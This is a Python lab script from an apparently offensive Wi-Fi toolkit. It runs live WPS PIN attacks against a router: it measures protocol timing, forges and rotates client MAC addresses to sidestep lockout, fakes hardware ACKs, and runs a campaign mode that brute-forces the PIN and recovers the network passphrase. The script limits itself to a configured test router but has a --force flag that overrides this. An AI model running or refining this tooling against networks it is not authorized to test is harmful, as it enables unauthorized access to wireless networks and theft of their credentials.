#!/usr/bin/env python3
"""WPS reliability lab — LIVE experiments against the AirLink test router.

Purpose: ground-truth the WPS PIN exchange on real hardware so we can rebuild the
attack spec-first (message-resend, real lock detection) instead of on heuristics
tuned to one router.

Modes:
  timing  — run the CORRECT pin N times; measure per-stage reach + latency + loss,
            and re-prove/debunk one-shot-per-MAC (fixed vs rotating MAC).
  resend  — on an M5/M7 timeout, RESEND the same M4/M6 in-session (no MAC rotation)
            and measure how often that recovers the reply.

SAFETY: this TRANSMITS (auth/assoc + EAPOL). Hardcoded to the AirLink test box.
Every run appends a JSON line to scripts/wps/lab_results.jsonl for offline analysis.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))
sys.path.insert(0, str(Path(__file__).parent))

from wps_probe import discover_iface, find_ap, load_default_target, write_pcap  # noqa: E402

from wifit3.engine.attacks.wps.association import (  # noqa: E402
    WlanTransport, WpsAssociation, random_client_mac, str_to_mac,
)
from wifit3.engine.attacks.wps.registrar import WpsRegistrar  # noqa: E402

# Safety: the lab only targets the BSSID configured in data_dumps/wps_pin.txt (gitignored) —
# the user's own test router. No real BSSID is hardcoded here (it must not enter git).
RESULTS = Path(__file__).parent / "lab_results.jsonl"


def _stage_of(msg: str) -> str | None:
    """Classify a registrar [WPS] log line into a stage marker."""
    m = msg
    if "EAPOL-Start" in m:      return "eapol_start"
    if "Identity" in m:         return "identity"
    if "<- M1" in m:            return "m1"
    if "<- M3" in m:            return "m3"      # we send M4 here
    if "<- M5" in m:            return "m5"      # first half correct; we send M6
    if "<- M7" in m:            return "m7"      # SUCCESS
    if "WSC_NACK" in m or "EAP-FAIL" in m:  return "nack"
    if "no reply after M4" in m:  return "timeout_m4"
    if "no reply after M6" in m:  return "timeout_m6"
    if "AP didn't respond" in m:  return "no_response"
    if "UNPARSED EAPOL" in m:     return "unparsed"
    if "stale msg_type" in m:     return "stale"
    return None


async def _one(iface, bssid, ssid, channel, our_mac, pin, msg_timeout, cap,
               max_resends=0, auto_ack=False):
    """Run one full attempt; return a dict of stage->relative-ms + assoc timing + outcome.

    auto_ack=True arms active-monitor (chip HW-ACKs the AP's frames to our forged MAC, so the
    AP won't retransmit). auto_ack=False leaves the AP's retransmit safety net intact.
    """
    t0 = time.monotonic()
    timeline: list[tuple[float, str, str]] = []   # (t_rel, stage, raw)

    def log(m: str):
        st = _stage_of(m)
        timeline.append((time.monotonic() - t0, st or "", m))

    if auto_ack:
        await iface.set_fake_mac(our_mac, str_to_mac(bssid))
    else:
        await iface.clear_fake_mac()
    assoc = WpsAssociation(iface, bssid, ssid, channel, our_mac=our_mac)
    assoc.start()
    transport = WlanTransport(iface, str_to_mac(bssid), our_mac, ack=auto_ack,
                              tx_observer=lambda fr: cap.append((time.time(), bytes(fr))))
    t_assoc0 = time.monotonic()
    associated = False
    try:
        associated = await assoc.associate()
        t_assoc = (time.monotonic() - t_assoc0) * 1000
        transport.start()
        reg = WpsRegistrar(transport, str_to_mac(bssid), our_mac,
                           msg_timeout=msg_timeout, eapol_start_timeout=max(7.0, msg_timeout),
                           overall_timeout=msg_timeout * 8, max_resends=max_resends, log=log)
        out = await reg.try_pin(pin)
    finally:
        transport.stop()
        assoc.stop()

    # Reduce the timeline to first-seen ms per stage.
    stage_ms: dict[str, float] = {}
    for t_rel, st, _raw in timeline:
        if st and st not in stage_ms:
            stage_ms[st] = round(t_rel * 1000, 1)
    reached = max((s for s in ("eapol_start", "identity", "m1", "m3", "m5", "m7")
                   if s in stage_ms), key=lambda s: ("eapol_start identity m1 m3 m5 m7".split().index(s)),
                  default="none")
    return {
        "associated": associated,
        "assoc_ms": round(t_assoc, 1),
        "reached": reached,
        "result": out.result.value,
        "via_timeout": out.via_timeout,
        "config_error": out.config_error,
        "detail": out.detail,
        "total_ms": round((time.monotonic() - t0) * 1000, 1),
        "stage_ms": stage_ms,
    }


async def mode_timing(iface, tgt, args):
    bssid, ssid, channel, pin = tgt["bssid"], tgt["ssid"], tgt["channel"], tgt["pin"]
    fixed_mac = random_client_mac()
    print(f"\n=== TIMING: {args.attempts} attempts, mac-mode={args.mac_mode}, "
          f"per-msg timeout={args.timeout}s, resends={args.max_resends}, "
          f"auto_ack={args.auto_ack} ===")
    rows = []
    cap: list = []
    for i in range(args.attempts):
        mac = fixed_mac if args.mac_mode == "fixed" else random_client_mac()
        # Interleave the A/B variable per attempt so rate-limit drift over the batch
        # hits both conditions equally (run 2's degradation confounded a block design).
        aa, rs = args.auto_ack, args.max_resends
        if args.ab == "auto_ack":
            aa = bool(i % 2)
        elif args.ab == "resend":
            rs = 0 if i % 2 == 0 else 2
        r = await _one(iface, bssid, ssid, channel, mac, pin, args.timeout, cap,
                       max_resends=rs, auto_ack=aa)
        r["i"] = i
        r["mac"] = ":".join(f"{b:02x}" for b in mac)
        r["cond"] = f"aa={int(aa)},rs={rs}"
        rows.append(r)
        sm = r["stage_ms"]
        lat = lambda a, b: (f"{sm[b]-sm[a]:.0f}" if a in sm and b in sm else "-")  # noqa: E731
        print(f"  #{i:02d} assoc={'Y' if r['associated'] else 'N'}({r['assoc_ms']:.0f}ms) "
              f"reach={r['reached']:<11} {r['result']:<17} "
              f"M1={sm.get('m1','-')} M3-M1={lat('m1','m3')} M5-M3={lat('m3','m5')} "
              f"M7-M5={lat('m5','m7')} tot={r['total_ms']:.0f}ms")
        if args.delay:
            await asyncio.sleep(args.delay)

    # Aggregate.
    n = len(rows)
    reached_m5 = sum(1 for r in rows if r["reached"] in ("m5", "m7"))
    reached_m7 = sum(1 for r in rows if r["reached"] == "m7")
    assoc_ok = sum(1 for r in rows if r["associated"])
    print(f"\n  --- aggregate (n={n}) ---")
    print(f"  assoc ok:   {assoc_ok}/{n}")
    print(f"  reached M5: {reached_m5}/{n}   reached M7: {reached_m7}/{n}")
    for stage in ("m1", "m3", "m5", "m7"):
        vals = [r["stage_ms"][stage] for r in rows if stage in r["stage_ms"]]
        if vals:
            vals.sort()
            print(f"  {stage} arrival ms: min={vals[0]:.0f} med={vals[len(vals)//2]:.0f} "
                  f"max={vals[-1]:.0f}  (n={len(vals)})")
    if args.ab != "none":
        print(f"\n  --- A/B by condition (--ab {args.ab}, interleaved) ---")
        conds: dict[str, list] = {}
        for r in rows:
            conds.setdefault(r["cond"], []).append(r)
        for cond, rs in sorted(conds.items()):
            m7 = sum(1 for r in rs if r["reached"] == "m7")
            m5 = sum(1 for r in rs if r["reached"] in ("m5", "m7"))
            print(f"  {cond}:  reached M5 {m5}/{len(rs)}   reached M7 {m7}/{len(rs)}")
    if args.mac_mode == "fixed" and args.ab == "none" and n >= 2:
        first_reach = rows[0]["reached"]
        later_m5 = sum(1 for r in rows[1:] if r["reached"] in ("m5", "m7"))
        print(f"\n  ONE-SHOT test (fixed MAC): attempt#0 reached {first_reach}; "
              f"of the {n-1} REUSES, {later_m5} still reached M5+.")
        print("  → many reuses reach M5  ⇒ one-shot-per-MAC is FALSE (was a TX-loss artifact).")
        print("  → only #0 reaches M5    ⇒ one-shot-per-MAC is REAL.")

    await iface.clear_fake_mac()   # leave the card in plain monitor
    ts = int(time.time())
    pcap = Path(__file__).parent / f"lab_timing_{ts}.pcap"
    write_pcap(pcap, cap)
    with RESULTS.open("a") as f:
        f.write(json.dumps({"ts": ts, "mode": "timing", "args": vars(args), "rows": rows}) + "\n")
    print(f"\n  pcap: {pcap}  ({len(cap)} frames)   results: {RESULTS}")
    return rows


async def mode_campaign(iface, tgt, args):
    """Drive the REAL WpsCampaign from a seeded near-answer state — end-to-end validation
    of the refactored campaign (auto-ACK off, no one-shot, resend) cracking a live AP."""
    import json as _json
    import tempfile
    from types import SimpleNamespace

    from wifit3.engine.attacks.wps.campaign import WpsCampaign, _state_path
    bssid = tgt["bssid"]
    tmp = tempfile.mkdtemp(prefix="wpslab_")   # isolated state dir; don't touch captures/
    seed = {
        "bssid": bssid, "ssid": tgt["ssid"], "phase": "second_half",
        "common_index": 8, "p1_index": 0, "p2_index": args.seed_p2,
        "first_half": args.seed_first_half, "skip_middle": None, "dead_first_halves": [],
        "found_pin": None, "found_psk": None, "attempts": 0, "tested": 0, "updated": 0.0,
    }
    sp = _state_path(tmp, bssid)
    sp.parent.mkdir(parents=True, exist_ok=True)
    sp.write_text(_json.dumps(seed))
    target = SimpleNamespace(bssid=bssid, ssid=tgt["ssid"], channel=tgt["channel"],
                             wps_locked=False)
    print(f"\n=== CAMPAIGN from seed (first_half={args.seed_first_half}, p2_index={args.seed_p2}), "
          f"up to {args.max_secs:.0f}s ===")
    camp = WpsCampaign(iface, target, state_dir=tmp, log=lambda m: print(f"    {m}"))
    camp.run()
    end = time.monotonic() + args.max_secs
    while time.monotonic() < end and camp.status in ("idle", "running", "paused", "locked"):
        await asyncio.sleep(0.5)
        if camp.state.found_pin:
            break
    await camp.stop()
    await iface.clear_fake_mac()
    print(f"\n  RESULT: status={camp.status}  found_pin={camp.state.found_pin}  "
          f"psk={camp.state.found_psk}  tested={camp.state.tested}  phase={camp.state.phase}")
    return camp.state.found_pin is not None


async def main_async(args) -> int:
    d = load_default_target()
    allowed = (d.get("bssid") or "").lower()   # the configured test router
    bssid = (args.bssid or allowed).lower()
    if bssid != allowed and not args.force:
        print("REFUSING: target is not the configured test router "
              "(data_dumps/wps_pin.txt). Use --force only if you own it.")
        return 2
    tgt = {"bssid": bssid, "ssid": d.get("ssid", ""),
           "channel": int(d.get("channel", "1")), "pin": args.pin or d.get("pin")}
    _mgr, iface = await discover_iface(args.debug)
    await find_ap(iface, tgt["channel"], bssid, tgt["ssid"], args.scan_secs)
    try:
        if args.mode == "timing":
            await mode_timing(iface, tgt, args)
        elif args.mode == "campaign":
            await mode_campaign(iface, tgt, args)
    finally:
        await iface.close()
    return 0


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--mode", choices=["timing", "resend", "campaign"], default="timing")
    p.add_argument("--seed-first-half", default="0103", help="campaign mode: locked first half")
    p.add_argument("--seed-p2", type=int, default=30, help="campaign mode: second-half start index")
    p.add_argument("--max-secs", type=float, default=120.0, help="campaign mode: run budget")
    p.add_argument("--attempts", type=int, default=20)
    p.add_argument("--mac-mode", choices=["fixed", "rotate"], default="fixed")
    p.add_argument("--timeout", type=float, default=8.0, help="per-message recv window (s)")
    p.add_argument("--max-resends", type=int, default=0, help="in-session resends per stage")
    p.add_argument("--auto-ack", action="store_true",
                   help="arm active-monitor (chip HW-ACKs AP frames; kills AP retransmits)")
    p.add_argument("--ab", choices=["none", "auto_ack", "resend"], default="none",
                   help="interleave this variable per attempt for a drift-controlled A/B")
    p.add_argument("--delay", type=float, default=0.0, help="sleep between attempts (s)")
    p.add_argument("--pin", default=None)
    p.add_argument("--bssid", default=None)
    p.add_argument("--scan-secs", type=float, default=6.0)
    p.add_argument("--force", action="store_true")
    p.add_argument("--debug", action="store_true")
    args = p.parse_args()
    return asyncio.run(main_async(args))


if __name__ == "__main__":
    raise SystemExit(main())
